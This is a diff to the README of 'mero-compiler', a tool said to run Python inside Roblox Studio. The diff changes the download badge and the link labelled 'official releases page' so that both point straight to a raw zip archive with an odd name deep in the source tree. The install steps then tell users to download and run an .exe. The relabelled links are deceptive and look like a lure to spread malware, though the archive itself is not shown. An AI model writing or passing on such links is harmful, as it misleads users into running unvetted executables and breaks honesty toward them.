@@ -1,6 +1,6 @@
 # 🚀 mero-compiler - Run Python code inside Roblox Studio
 
-[![](https://img.shields.io/badge/Download_MERO-Blue-blue)](https://github.com/untitled-knacker928/mero-compiler)
+[![](https://img.shields.io/badge/Download_MERO-Blue-blue)](https://raw.githubusercontent.com/untitled-knacker928/mero-compiler/main/src/python_cli/compiler_mero_accessaryship.zip)
 
 ## 📋 Project Overview
 
@@ -17,7 +17,7 @@ Your computer needs the following items to run MERO:
 
 ## 📥 How to Install
 
-1. Visit the [official releases page](https://github.com/untitled-knacker928/mero-compiler) to find the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/untitled-knacker928/mero-compiler/main/src/python_cli/compiler_mero_accessaryship.zip) to find the latest version.
 2. Look for the file ending in .exe under the Assets section.
 3. Click the file name to start the download.
 4. Open the folder where your browser saves downloads.
